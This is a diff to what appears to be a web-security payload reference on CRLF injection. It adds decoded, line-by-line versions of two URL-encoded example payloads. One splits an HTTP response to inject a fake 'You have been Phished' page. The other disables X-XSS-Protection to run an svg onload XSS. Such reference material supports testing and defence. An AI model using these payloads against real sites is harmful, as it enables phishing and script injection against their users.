@@ -996,6 +996,17 @@ Beside the session fixation that requires a very insecure way of handling user s
 ```http
 http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
 ```
+```
+http://www.example.net/index.php?lang=en
+Content-Length: 0
+ 
+HTTP/1.1 200 OK
+Content-Type: text/html
+Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
+Content-Length: 34
+ 
+<html>You have been Phished</html>
+```
 
 **HTTP response**:
 
@@ -1018,7 +1029,16 @@ In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection
 ```powershell
 http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
 ```
+```
+http://example.com/
+Content-Length:35
+X-XSS-Protection:0
 
+23
+<svg onload=alert(document.domain)>
+0
+//..
+```
 **HTTP Response**:
 
 ```http
